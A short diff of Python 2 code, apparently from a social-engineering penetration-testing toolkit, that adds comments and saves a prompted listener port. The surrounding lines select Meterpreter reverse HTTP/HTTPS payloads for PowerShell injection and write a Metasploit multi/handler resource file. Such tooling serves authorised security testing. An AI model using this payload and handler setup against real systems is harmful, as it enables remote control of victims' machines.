@@ -18,6 +18,7 @@ else:
 powershell_inject_x64 = check_config("POWERSHELL_INJECT_PAYLOAD_X64=")
 powershell_inject_x86 = check_config("POWERSHELL_INJECT_PAYLOAD_X86=")
 
+# if we specified a hostname then default to reverse https/http
 if validate_ip(ipaddr) == False:
         powershell_inject_x64 = "windows/meterpreter/reverse_https"
         powershell_inject_x86 = "windows/meterpreter/reverse_http"
@@ -36,16 +37,23 @@ if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepat
 		filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
 		filewrite.close()
 
+# check to see if the meta config multi pyinjector is there
 if not os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
 	if os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
 		fileopen = file("%s/src/program_junk/port.options" % (definepath), "r")
 		port = fileopen.read()
 
+	# if port.options isnt there then prompt
 	if not os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
 		port=raw_input(setprompt(["4"], "Enter the port for Metasploit to listen on for powershell [443]"))
 		if port == "": port = "443"
+		# write out port.options for later use
+		filewrite = file("%s/src/program_junk/port.options" % (definepath), "w")
+		filewrite.write(port)
+		filewrite.close()
 
 print_status("Generating x64-based powershell injection code...")
+# define a base variable
 x64 = ""
 x86 = ""
 
